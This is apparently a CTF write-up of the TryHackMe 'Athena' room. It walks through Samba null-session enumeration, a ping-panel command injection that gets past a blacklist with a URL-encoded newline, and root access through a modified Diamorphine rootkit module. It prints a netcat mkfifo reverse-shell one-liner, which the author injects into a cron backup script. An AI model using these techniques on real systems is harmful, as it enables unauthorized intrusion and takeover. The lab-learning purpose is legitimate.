## INTRO

Room URL: https://tryhackme.com/room/4th3n4

On a hot September afternoon, I thought I could relax by playing around with a machine available on TryHackMe. In the end, I decided to go with “Athena.” I must admit that I found every phase of the penetration test to be quite enjoyable and fascinating. Let’s go in action!

## ENUMERATION

Let’s start right away with a basic reconnaissance using “nmap” to look for open services:

[Nmap scan all port](https://tommasogreco.github.io/assets/img/blogs/athena/nmap1.webp)

Alright! nmap found the SSH port open, as well as the HTTP port, and ports 139 and 445 for SAMBA sharing. Entering Athena’s IP in the browser opens the website hosted on what seems to be a rather outdated version of Apache.

[Athena mithology](https://tommasogreco.github.io/assets/img/blogs/athena/athena.webp)

I’m going to run some nmap scripts to try and gather more information:

[Enum http method](https://tommasogreco.github.io/assets/img/blogs/athena/nmap2.webp)

[Nmap http brute](https://tommasogreco.github.io/assets/img/blogs/athena/nmap3.webp)

I can’t find anything else of interest with nmap. The situation remains the same when using “Nikto.”

For now, I decide not to scan directories and files on the Apache server. I would come back to it later if needed. I’m moving on to enumerate Samba, which we saw as active in its version 4.6.2 with nmap.  
I’m using “==enum4linux==” with the “-a” option to gather all possible information about the Samba server.

[Enum4linux](https://tommasogreco.github.io/assets/img/blogs/athena/enum4linux1.webp)

I discover several interesting things: it’s vulnerable to null session attacks, “athena” is a user on the machine, and ROUTERPANEL is the name of the workgroup.

[Null session vuln](https://tommasogreco.github.io/assets/img/blogs/athena/enum4linux2.webp)

[Enum4linux](https://tommasogreco.github.io/assets/img/blogs/athena/enum4linux1.webp)

Let’s perform the null session attack:

[Smnclient](https://tommasogreco.github.io/assets/img/blogs/athena/smbclient1.webp)

[Smnclient](https://tommasogreco.github.io/assets/img/blogs/athena/smbclient2.webp)

As a “gift,” we receive information that a new ping system is being developed and can be found at the address /myrouterpanel.

[Pager of router panel](https://tommasogreco.github.io/assets/img/blogs/athena/web1.webp)

As soon as i opened this page, i thought this was my entry point to the machine; certainty that gradually grew in the various attempts of “command injection” i executed and failed. All [shell operators](https://www.geeksforgeeks.org/basic-operators-in-shell-scripting/) that can be used to inject a post-ping execution command are blocked. All except one… or two :).

**“%0A” = URL code for \n newline  
“$(cmd)”**

[Command inject](https://tommasogreco.github.io/assets/img/blogs/athena/web2.webp)

We bypass the special character blacklist using the newline URI code, allowing us to execute a new command, in this case, “id,” after the “ping.” We use the “BurpSuite” tool to intercept the browser’s responses and perform the command injection.

[Burpsuite request](https://tommasogreco.github.io/assets/img/blogs/athena/burp1.webp)

Now that we’ve confirmed the possibility of command injection, we can get a reverse shell using “netcat.”

## POST-EXPLOITATION:

Every time I obtain a shell, I always conduct a quick reconnaissance of the directories where you can typically find valuable information. Often, without much effort, you can uncover juicy details. Unfortunately, that’s not the case with this reconnaissance.

On Linux, there are various tools that allow us to gather exploitable information. Typically, I use LinPeas, LinEnum, and/or Pspy64. The first two provide almost the same information, while the third monitors Unix processes in real-time.

I opt to upload the third tool to the temp folder and run it. I notice immediately:

[Pspy in action](https://tommasogreco.github.io/assets/img/blogs/athena/pspy1.webp)

Okay, in practice, the user “1001,” which according to the /etc/passwd file is “athena,” creates backups using a cron job that runs a script called “backup.sh.”

`cat backup.sh`

```
backup_dir_zip=~/backup  
  
mkdir -p "$backup_dir_zip"  
  
cp -r /home/athena/notes/* "$backup_dir_zip"  
  
zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"  
  
rm /home/athena/backup/*.txt  
rm /home/athena/backup/*.sh  
  
echo "Backup completed..."
```

```
ls -al  
total 20  
drwxr-xr-x 2 athena www-data 4096 May 28 18:59 .  
drwxr-xr-x 236 root root 12288 May 26 12:44 ..  
-rwxr-xr-x 1 www-data athena 258 May 28 18:59 backup.sh
```

We’ve obtained a shell with the privileges of the “www-data” user, who has permissions to edit the “backup.sh” file. Fantastic! I’ll modify the file to get a reverse shell directly as the “athena” user.

`vi backup.sh`

```
add  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc X.X.X.X 443 >/tmp/
```

[Reverse shell with netcat](https://tommasogreco.github.io/assets/img/blogs/athena/netcat1.webp)

```
cd /home/athena  
more user.txt
```

This is the user flag.

## PRIVILEGE ESCALATION:

Now, all that’s left is to escalate our privileges to “root,” and to do that, what could be more beautiful than trying the most basic command in the world that can quickly open the… doors of Athena?

```
sudo -l  
Matching Defaults entries for athena on routerpanel:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User athena may run the following commands on routerpanel:  
(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

Ok, it seems we can run this command with root privileges. “**_Insmod_**” does exactly what the name says: it inserts the module into the kernel. At this point, I think it’s almost mandatory to understand what this “VENOM.KO” is and what it does.

```
modinfo venom.ko  
filename: /mnt/.../secret/venom.ko  
description: LKM rootkit  
author: m0nad  
license: Dual BSD/GPL  
srcversion: 93A81462832D4CF52F916D7  
depends:  
retpoline: Y  
name: venom  
vermagic: 5.15.0-69-generic SMP mod_unload modversions
```

Searching on the internet for “venom.ko” with the author’s name “m0nad,” I find this link:

[Diamorphine](https://github.com/m0nad/Diamorphine?source=post_page-----4f45a4e15466-----------------------------------------))

“**_venom.ko_**” is a rootkit LKM designed to infect the Linux kernel and can be used to elevate privileges and hide other malicious processes. It can certainly come in handy for us, so we need to understand how it works. We’ll analyze it using **Ghidra**. Furthermore, the note “ENDING A SIGNAL 64(TO ANY PID) MAKES THE GIVEN USER BECOME ROOT” is interesting to us: by executing “kill -64” on any PID (running program), we become root.  
After downloading the module, we open it with _Ghidra_ and do the first silly thing that comes to mind, which is looking for a function that does what it promises… making us root on the machine.

[Ghidra](https://tommasogreco.github.io/assets/img/blogs/athena/ghidra1.webp)

We need to follow the functions. Double-click on the “hacked_Kill” function…

[Ghidra](https://tommasogreco.github.io/assets/img/blogs/athena/ghidra2.webp)

We become root if signal 0x39 is sent, which in hexadecimal is “57”. On the GitHub page of the rootkit author, we had read that the signal to be launched was “64”. Some mischievous person has modified the rootkit :).  
Let’s take action!
